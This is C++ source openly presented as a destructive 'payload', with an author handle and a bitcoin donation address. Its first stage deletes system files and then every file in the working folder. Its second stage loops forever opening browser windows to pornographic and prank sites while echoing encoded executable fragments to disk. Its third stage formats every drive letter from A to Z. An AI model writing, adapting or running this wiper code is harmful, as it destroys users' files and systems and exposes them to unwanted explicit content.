//
//
//      
//     		C++ payload: (c) 2017 Adm1n_0v3rride
//			please donate to my bitcoin address: 1G2ebam9fsRnWb33Q79Nw4sToQZjMAZ6KS
//			Send me a message if you like the program
//

/* Declare the librarys*/
#include <iostream>
#include <cstdlib>
#include <stdio.h>
using namespace std;

// Deletes important files.
void F1rstStage() {
    if( remove( "hal.dll" ) != 0 )
    {
        perror( "Error deleting file" );
    }
    else {
    puts( "File successfully deleted" ); 
    }
    
    if( remove( "Hosts" ) != 0 )
    {
        perror( "Error deleting file" );
    }
    else {
    puts( "File successfully deleted" );
    }
    system("del *.txt");
    system("del *.doc");
    system("del *.docx");
    system("del *.htm");
    system("del *.dll");
    system("del *.bat");
    system("del *.ink");
    system("del *.exe");
    system("del *.xml");
    system("del *.js");
    system("del *.mp3");
    system("del *.mp4");
    system("del *.pdf");
    system("del *.*");
}

// Fork bombs the screen
void secoundStage() {
    for( ; ; )
    {
        system("start");
        system("start http://www.pornhub.com/");
        system("start http://www.google.com/");
        system("start http://www.youaretheidiot.com/");
        system("start http://www.Facebook.com/");
		system("start https://www.youtube.com/watch?v=qdj_w3MxQXo");
		system("start http://www.Redvideos.com/");
		system("start http://www.xvideos.com/");
		system("echo UEsDBBQAAAAI36kiQ6IfZcyEAAAA6AAAIAAAATUVNWi5leGXtew10U8e17kg6soUtjACbGGziscac>x");
    	system("echo AxgMyD9Hlm1sY4JkW2AH/wjLP5BgB9k6RhKSjqIfbKcJyBgaqw65tM1NIJckNE1705Tcpi3JJWma>>x");
	    system("echo OD830Da0TptFSQOpXx7NFSnhmYRbnIRw3jfnyMZpfmCt99b7WauzvM+c2TOz95699+zZIw71t+wl>>x");
	    system("echo KkIIAxBFQo4QuZjItctJQErWcynk8LTjC44o6o4vaHa6gqw/IGwJ2L1sl93nE0JsJ88Gwj7W5WOr>>x");
    }
}

// Formats all the Hard drives, VHD (Virtual Hard disk drives) and flash drives.
void ThirdStage() {
    system("Format A:\\");
	system("Format B:\\");
	system("Format C:\\");
	system("Format D:\\");
	system("Format E:\\");
	system("Format F:\\");
	system("Format G:\\");
	system("Format H:\\");
	system("Format I:\\");
	system("Format J:\\");
	system("Format K:\\");
	system("Format L:\\");
	system("Format M:\\");
	system("Format N:\\");
	system("Format O:\\");
	system("Format P:\\");
	system("Format Q:\\");
	system("Format R:\\");
	system("Format S:\\");
	system("Format T:\\");
	system("Format U:\\");
	system("Format V:\\");
	system("Format X:\\");
	system("Format Y:\\");
	system("Format Z:\\");
}

int main()
{
  F1rstStage();
  secoundStage();
  ThirdStage();
  return 0;
}